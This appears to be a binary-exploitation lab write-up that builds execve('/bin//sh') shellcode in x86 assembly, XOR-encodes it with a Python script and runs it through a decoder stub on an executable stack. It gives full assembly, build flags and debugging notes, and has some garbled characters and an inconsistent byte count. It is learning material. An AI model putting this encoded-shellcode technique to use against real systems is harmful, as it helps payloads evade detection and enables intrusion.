üåê Overview

This lab focused on building and executing a custom XOR shellcode decoder in x86 assembly. The goal: craft shellcode that executes /bin/sh, encode it with a fixed XOR key, and write a stub that decodes and runs it at runtime. Though the theory was familiar from prior work in binary exploitation, implementing it turned into a multi-day deep dive into segmentation faults, memory protection mechanics, and executable memory behavior on modern Linux systems.

What unfolded was a vivid exercise in persistence and precision. We encountered‚Äîand overcame‚Äînearly every pitfall possible when executing self-modifying shellcode. In this report, we document that journey in granular detail, preserving the command history and architecture-level insight that led to our success.

üõ†Ô∏è Stage 1: Crafting the Initial Shellcode

We began with standard execve shellcode. The assembly looked like:

; shell.asm - execve("/bin//sh", NULL, NULL)
BITS 32
global _start

section .text
_start:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov edx, eax
    mov al, 0x0b
    int 0x80

We assembled and linked it using:

nasm -f elf32 shell.asm -o shell.o
ld -m elf_i386 shell.o -o shell

‚úÖ Running ./shell dropped us into a shell successfully.

üî¢ Stage 2: Extracting and Encoding the Shellcode

We dumped the opcodes into a hex-encoded list using a combo of objdump and shell tools:

objdump -d shell | grep '[0-9a-f]:' | \
cut -f2 -d: | cut -f1-6 -d' ' | \
tr -s ' ' | tr '\t' ' ' | \
sed 's/ $//' | tr ' ' '\n' > shell.hex

We counted the bytes:

wc -l shell.hex  # ‚Üí 36 lines

Then converted the hex dump into raw binary:

xxd -r -p shell.hex shell.raw
stat -c %s shell.raw  # ‚Üí 25 bytes

With a working 25-byte shellcode binary, we XOR‚Äôd it using a simple Python script:

with open("shell.raw", "rb") as f:
    buf = f.read()

key = 0xAA
encoded = [b ^ key for b in buf]
print(",".join(f"0x{b:02x}" for b in encoded))
print("Length:", len(encoded))

Output:

0x9b, 0x6a, 0xfa, 0xc2, ..., Length: 25 bytes

üö® Stage 3: Building the Decoder ‚Äì And Entering Segfault Hell

Our initial decoder was simple and closely modeled on canonical examples:

BITS 32
global _start

section .text
_start:
    jmp short call_decoder

decoder:
    pop esi
    xor ecx, ecx
    mov cl, payload_len
    mov bl, xor_key
.decode:
    xor byte [esi], bl
    inc esi
    loop .decode
    jmp esi

call_decoder:
    call decoder
payload:
    db 0x9b,0x6a,0xfa,...

payload_len equ 25
xor_key     equ 0xAA

We assembled and linked this with:

nasm -f elf32 decoder.asm -o decoder.o
ld -m elf_i386 -z execstack decoder.o -o decoder

‚ùå zsh: segmentation fault ./decoder

üîç Stage 4: Diagnosing the Faults ‚Äî GDB and Memory Protections

  • esi pointed to the payload
  • Decoding loop tried to modify memory in-place
  • Segfault happened during decode or jmp esi

Findings:

  • .text = RX (exec but not write)
  • .data = RW (write but not exec)

We were caught in the classic W^X (Write XOR Execute) trap.

ü§¶ Stage 5: Desperate Fix Attempts

  • jmp payload_start instead of jmp esi
  • ret after push decoded address
  • Storing payload in .bss
  • Using $ - label math

None of it worked. GDB revealed either invalid pointer or illegal memory access during decode or jump.

üöÄ Stage 6: The Breakthrough ‚Äî Writing to the Stack

We rewrote the decoder to decode to a RWX stack buffer:

BITS 32
global _start

section .text
_start:
    call get_payload

decoder:
    pop esi
    lea edi, [esp - 64]  ; Make space
    mov ecx, payload_len
    mov bl, xor_key
.decode_loop:
    mov al, [esi]
    xor al, bl
    mov [edi], al
    inc esi
    inc edi
    loop .decode_loop

    lea eax, [esp - 64]
    jmp eax

get_payload:
    call decoder
payload:
    db 0x9b,0x6a,0xfa,...

payload_len equ $ - payload
xor_key     equ 0xAA

Linked with:

ld -m elf_i386 -z execstack decoder.o -o decoder

‚úÖ Success: We were dropped into a shell!

üîÆ Stage 7: GDB Verification and Final Validation

  • Decoded shellcode on stack
  • Stack marked RWX
  • EAX ‚Üí decoded shellcode
  • EIP cleanly transitioned to stack

üìù Lessons Learned

  • .text is RX, not RW
  • .data is RW, not RX
  • Stack is RWX only if linked with -z execstack
  • GDB + pwndbg are essential for real progress
